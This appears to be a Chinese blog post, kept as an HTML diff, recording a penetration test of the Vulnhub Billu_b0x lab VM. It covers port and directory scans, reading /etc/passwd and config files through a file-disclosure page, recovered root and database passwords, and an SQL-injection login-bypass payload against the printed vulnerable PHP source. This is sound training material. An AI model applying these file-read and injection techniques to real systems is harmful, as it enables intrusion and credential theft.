@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,渗透测试,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="靶机Vulnhub–Billu_b0x 下载链接 目标Boot to root：通过各种方式获取虚拟机的root权限。 我的攻击机是kali。靶机直接用VMware打开就行了，设置网络模式为NAT。这个靶机打开后是要登陆的，因为不知道用户名和密码，所以没法登陆，开机就好了。  ​     工具 nmap 发现目标ip，并进行端口扫描及服务识别 dirb  爆破目录 dirbuster 爆破目录 s">
+<meta name="keywords" content="web,渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-Billu_b0x 靶机的渗透测试学习记录">
+<meta property="og:url" content="http://yoursite.com/2018/11/26/2018-11-26-Vulnhub-Billu_b0x-靶机的渗透测试学习记录/index.html">
+<meta property="og:site_name" content="zs0zrc">
+<meta property="og:description" content="靶机Vulnhub–Billu_b0x 下载链接 目标Boot to root：通过各种方式获取虚拟机的root权限。 我的攻击机是kali。靶机直接用VMware打开就行了，设置网络模式为NAT。这个靶机打开后是要登陆的，因为不知道用户名和密码，所以没法登陆，开机就好了。  ​     工具 nmap 发现目标ip，并进行端口扫描及服务识别 dirb  爆破目录 dirbuster 爆破目录 s">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/picture/1543229527344.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543227549754.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543230323035.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543230465417.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543238327295.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543233943557.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543238624411.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543234011931.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543234816390.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543288219513.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543288342890.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543291516514.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543292000054.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543293020109.png">
+<meta property="og:image" content="http://yoursite.com/picture/1545179706897.png">
+<meta property="og:image" content="http://yoursite.com/picture/1545180281797.png">
+<meta property="og:image" content="http://yoursite.com/picture/1545182108024.png">
+<meta property="og:image" content="http://yoursite.com/picture/1545181369534.png">
+<meta property="og:image" content="http://yoursite.com/picture/1545181410560.png">
+<meta property="og:image" content="http://yoursite.com/picture/1545181280667.png">
+<meta property="og:image" content="http://yoursite.com/picture/1543295522480.png">
+<meta property="og:updated_time" content="2019-01-02T08:24:35.705Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vulnhub-Billu_b0x 靶机的渗透测试学习记录">
+<meta name="twitter:description" content="靶机Vulnhub–Billu_b0x 下载链接 目标Boot to root：通过各种方式获取虚拟机的root权限。 我的攻击机是kali。靶机直接用VMware打开就行了，设置网络模式为NAT。这个靶机打开后是要登陆的，因为不知道用户名和密码，所以没法登陆，开机就好了。  ​     工具 nmap 发现目标ip，并进行端口扫描及服务识别 dirb  爆破目录 dirbuster 爆破目录 s">
+<meta name="twitter:image" content="http://yoursite.com/picture/1543229527344.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/26/2018-11-26-Vulnhub-Billu_b0x-靶机的渗透测试学习记录/">
+
+
+
+
+
+  <title>Vulnhub-Billu_b0x 靶机的渗透测试学习记录 | zs0zrc</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zs0zrc</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/2018-11-26-Vulnhub-Billu_b0x-靶机的渗透测试学习记录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zs0zrc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zs0zrc">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Vulnhub-Billu_b0x 靶机的渗透测试学习记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-26T18:10:05+08:00">
+                2018-11-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/11/26/2018-11-26-Vulnhub-Billu_b0x-靶机的渗透测试学习记录/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/26/2018-11-26-Vulnhub-Billu_b0x-靶机的渗透测试学习记录/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>Vulnhub–Billu_b0x</p>
+<p><a href="https://download.vulnhub.com/billu/Billu_b0x.zip" target="_blank" rel="noopener">下载链接</a></p>
+<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>Boot to root：通过各种方式获取虚拟机的root权限。</p>
+<p>我的攻击机是kali。靶机直接用VMware打开就行了，设置网络模式为NAT。这个靶机打开后是要登陆的，因为不知道用户名和密码，所以没法登陆，开机就好了。</p>
+<p><img src="/picture/1543229527344.png" alt="1543229527344"></p>
+<p>​    </p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
+<li>nmap 发现目标ip，并进行端口扫描及服务识别</li>
+<li>dirb  爆破目录</li>
+<li>dirbuster 爆破目录</li>
+<li>sqlmap  用来进行sql注入</li>
+<li>蚁剑  <a href="https://doc.u0u.us/zh-hans/index.html" target="_blank" rel="noopener">文档</a>  管理webshell</li>
+<li>kali虚拟机</li>
+</ul>
+<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><ul>
+<li><p>发现ip</p>
+<blockquote>
+<p>nmap -sP 192.168.133.1/24</p>
+<p>-sP参数代表着ping扫描， 扫描kali所属的C网段</p>
+<p>扫出的ip为192.168.133.150</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/picture/1543227549754.png" alt="1543227549754"></p>
+<ul>
+<li><p>端口扫描</p>
+<blockquote>
+<p>nmap -p1-65535 -A 192.168.133.150</p>
+<p>扫描目标机开的端口，及服务</p>
+</blockquote>
+<p>  <img src="/picture/1543230323035.png" alt="1543230323035"></p>
+<p>  发现开启了22端口和80端口</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+<p>  访问80端口的web服务，只有一个登陆界面，并且提示  show me you sqli skills。说明这个页面存在sql注入，但是先不管它。</p>
+<p>  <img src="/picture/1543230465417.png" alt="1543230465417"></p>
+</li>
+<li><p>爆破目录</p>
+<p>  利用kali自带的dirb工具</p>
+<blockquote>
+<p>dirb  <a href="http://192.168.133.150:80" target="_blank" rel="noopener">http://192.168.133.150:80</a>    </p>
+</blockquote>
+<p>  爆出来的路径, 得到页面较多，test.php、add.php、in.php、c.php、index.php、show.php等，目录有：uploaded_images，phpmy等</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@zs0zrc:~# dirb  http://192.168.133.150:80</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Nov 26 18:48:26 2018</span><br><span class="line">URL_BASE: http://192.168.133.150:80/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.133.150:80/ ----</span><br><span class="line">+ http://192.168.133.150:80/add (CODE:200|SIZE:307)                               </span><br><span class="line">+ http://192.168.133.150:80/c (CODE:200|SIZE:1)                                   </span><br><span class="line">+ http://192.168.133.150:80/cgi-bin/ (CODE:403|SIZE:291)                         </span><br><span class="line">+ http://192.168.133.150:80/head (CODE:200|SIZE:2793)  </span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://192.168.133.150:80/images/                                 </span><br><span class="line">+ http://192.168.133.150:80/in (CODE:200|SIZE:47559)                             </span><br><span class="line">+ http://192.168.133.150:80/index (CODE:200|SIZE:3267)                           </span><br><span class="line">+ http://192.168.133.150:80/index.php (CODE:200|SIZE:3267)                       </span><br><span class="line">+ http://192.168.133.150:80/panel (CODE:302|SIZE:2469)                           </span><br><span class="line">+ http://192.168.133.150:80/server-status (CODE:403|SIZE:296)                     </span><br><span class="line">+ http://192.168.133.150:80/show (CODE:200|SIZE:1)                               </span><br><span class="line">+ http://192.168.133.150:80/test (CODE:200|SIZE:72)                                </span><br><span class="line">---- Entering directory: http://192.168.133.150:80/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &apos;-w&apos; if you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Nov 26 18:48:30 2018</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 11</span><br></pre></td></tr></table></figure>
+<p>  用dirbuster工具</p>
+<p>  <img src="/picture/1543238327295.png" alt="1543238327295"></p>
+</li>
+<li><p>漏洞挖掘</p>
+<p>  漏洞挖掘从下面几个方面入手</p>
+<ul>
+<li>首页的SQL注入，毕竟它提示了</li>
+<li>查看爆破目录的结果，看是否有什么其它有用的信息</li>
+<li>用工具扫</li>
+<li>如果可以得到网站的源码，也可以用工具去扫描漏洞</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><p>先SQL注入一波，话不多说，sqlmap开跑</p>
+<blockquote>
+<p>sqlmap -u “<a href="http://192.168.133.150&quot;" target="_blank" rel="noopener">http://192.168.133.150&quot;</a> –data “un=admin&amp;ps=admin&amp;login=let%27s+login” –level 3 –dbms mysql</p>
+<p>  这个因为我试不出它过滤了什么，所以直接用salmap跑，跑了好久都跑不出来。打扰了</p>
+</blockquote>
+<p> SQL注入，暂时failed</p>
+</li>
+<li><p>查看爆破出来的网页路径有没什么有用的信息</p>
+<p> 如下</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+ http://192.168.133.150:80/in (CODE:200|SIZE:47559)                           </span><br><span class="line">+ http://192.168.133.150:80/index (CODE:200|SIZE:3267)                         </span><br><span class="line">+ http://192.168.133.150:80/index.php (CODE:200|SIZE:3267)                     </span><br><span class="line">+ http://192.168.133.150:80/panel (CODE:302|SIZE:2469)                         </span><br><span class="line">+ http://192.168.133.150:80/server-status (CODE:403|SIZE:296)                 </span><br><span class="line">+ http://192.168.133.150:80/show (CODE:200|SIZE:1)                            </span><br><span class="line">+ http://192.168.133.150:80/test (CODE:200|SIZE:72)</span><br></pre></td></tr></table></figure>
+<p>  分别访问下，感觉可能有用的几个</p>
+<blockquote>
+<p> <a href="http://192.168.133.150:80/in" target="_blank" rel="noopener">http://192.168.133.150:80/in</a></p>
+<p>这个会将php的配置信息打印出来，会暴露一些敏感信息</p>
+</blockquote>
+<p> <img src="/picture/1543233943557.png" alt="1543233943557"></p>
+<p> <img src="/picture/1543238624411.png" alt="1543238624411"></p>
+<blockquote>
+<p><a href="http://192.168.133.150:80/server-status" target="_blank" rel="noopener">http://192.168.133.150:80/server-status</a></p>
+<p>不允许访问</p>
+</blockquote>
+<blockquote>
+<p><a href="http://192.168.133.150:80/test" target="_blank" rel="noopener">http://192.168.133.150:80/test</a> </p>
+<p>这个要求”file”参数不为空，我试了下，发现是POST请求的参数。利用谷歌浏览器的插件POSTman，发送post请求，参数为 file = “test.php”。发现它直接将源代码返回给我了，利用这个可以读取所有网页的代码</p>
+</blockquote>
+<p> <img src="/picture/1543234011931.png" alt="1543234011931"></p>
+<p> 发送POST请求</p>
+<p> <img src="/picture/1543234816390.png" alt="1543234816390"></p>
+</li>
+<li><p>利用test读取文件的功能，读取/etc/passwd</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/false</span><br><span class="line">mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">messagebus:x:103:106::/var/run/dbus:/bin/false</span><br><span class="line">whoopsie:x:104:107::/nonexistent:/bin/false</span><br><span class="line">landscape:x:105:110::/var/lib/landscape:/bin/false</span><br><span class="line">sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</span><br></pre></td></tr></table></figure>
+<p> 可以发现拥有root权限的两个账号分别为  root和 ica</p>
+</li>
+<li><p>利用test  将网站的源代码搞到手，然后开始源码审计</p>
+<p> 发现在c.php中有数据库的用户名及密码</p>
+<p> <img src="/picture/1543288219513.png" alt="1543288219513"></p>
+<p> 用户名为 billu ,密码为b0x_billu，所以利用这用户密码登陆数据库</p>
+<p> <img src="/picture/1543288342890.png" alt="1543288342890"></p>
+<p> 登进去了，然后我就不知道做什么了…..打扰了。尝试用mysql的密码登陆ssh，发现失败了。接着试了下用数据库中的用户名和密码登陆ssh，还是失败了。打扰了，orz</p>
+<p> 想了下，phpmyadmin的默认配置文件好像会有服务器的密码。于是就将它读取了出来</p>
+<p> 猜的路径为 /phpmy/config.inc.php</p>
+<p> <img src="/picture/1543291516514.png" alt="1543291516514"></p>
+<p> 哇哦 ，看得到了什么，  服务器用户 root，密码 为roottoor</p>
+<p> 再次尝试登陆ssh，一下就登进去了。root权限，相干啥就干啥咯。其实到这里实验就算结束了。但是还有SQL注入没玩，所以我就又去玩了玩。</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"> index.php 源码：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'c.php'</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'head.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(@$_SESSION[<span class="string">'logged'</span>]!=<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    	$_SESSION[<span class="string">'logged'</span>]=<span class="string">''</span>;</span><br><span class="line">    	</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'logged'</span>]==<span class="keyword">true</span> &amp;&amp;  $_SESSION[<span class="string">'admin'</span>]!=<span class="string">''</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"you are logged in :)"</span>;</span><br><span class="line">    	header(<span class="string">'Location: panel.php'</span>, <span class="keyword">true</span>, <span class="number">302</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">    &lt;div align=center style="margin:30px 0px 0px 0px;"&gt;</span></span><br><span class="line"><span class="string">        &lt;font size=8 face="comic sans ms"&gt;--==[[ billu b0x ]]==--&lt;/font&gt;</span></span><br><span class="line"><span class="string">        &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">    Show me your SQLI skills </span></span><br><span class="line"><span class="string">                &lt;br&gt;</span></span><br><span class="line"><span class="string">                    &lt;form </span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    =post&gt;</span></span><br><span class="line"><span class="string">    Username :- </span></span><br><span class="line"><span class="string">                        &lt;Input type=text name=un&gt; &amp;nbsp Password:- </span></span><br><span class="line"><span class="string">                            &lt;input type=password name=ps&gt;</span></span><br><span class="line"><span class="string">                                &lt;br&gt;</span></span><br><span class="line"><span class="string">                                    &lt;br&gt;</span></span><br><span class="line"><span class="string">                                        &lt;input type=submit name=login value="let\'s login"&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    	$uname=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'un'</span>]));</span><br><span class="line">    	$pass=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'ps'</span>]));</span><br><span class="line">    	$run=<span class="string">'select * from auth where  pass=\''</span>.$pass.<span class="string">'\' and uname=\''</span>.$uname.<span class="string">'\''</span>;</span><br><span class="line">    	$result = mysqli_query($conn, $run);</span><br><span class="line">    <span class="keyword">if</span> (mysqli_num_rows($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    $row = mysqli_fetch_assoc($result);</span><br><span class="line">    	   <span class="keyword">echo</span> <span class="string">"You are allowed</span></span><br><span class="line"><span class="string">                                            &lt;br&gt;"</span>;</span><br><span class="line">    	   $_SESSION[<span class="string">'logged'</span>]=<span class="keyword">true</span>;</span><br><span class="line">    	   $_SESSION[<span class="string">'admin'</span>]=$row[<span class="string">'username'</span>];</span><br><span class="line">    	   </span><br><span class="line">    	 header(<span class="string">'Location: panel.php'</span>, <span class="keyword">true</span>, <span class="number">302</span>);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                                                &lt;script&gt;alert('Try again');&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    	</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">                                                &lt;font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\"&gt;B0X Powered By </span></span><br><span class="line"><span class="string">                                                    &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; "</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>可以发现它的过滤语句 和SQL查询语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str_replace(&apos;\&apos;&apos;,&apos;&apos;,urldecode($_POST[&apos;un&apos;]));</span><br><span class="line">$run=&apos;select * from auth where  pass=\&apos;&apos;.$pass.&apos;\&apos; and uname=\&apos;&apos;.$uname.&apos;\&apos;&apos;;</span><br><span class="line">str_replace的作用是将字符串&apos; 替换为空，所以构造SQL注入payload时必须在最后加一个&apos;字符</span><br><span class="line"></span><br><span class="line">利用后台万能密码 &apos; or 1=1 -- \&apos;直接登上去了</span><br></pre></td></tr></table></figure>
+<p>进入panel.php页面</p>
+<p><img src="/picture/1543292000054.png" alt="1543292000054"></p>
+<p>发现这里可以上传文件，查看下源代码先</p>
+<p>panel.php源代码</p>
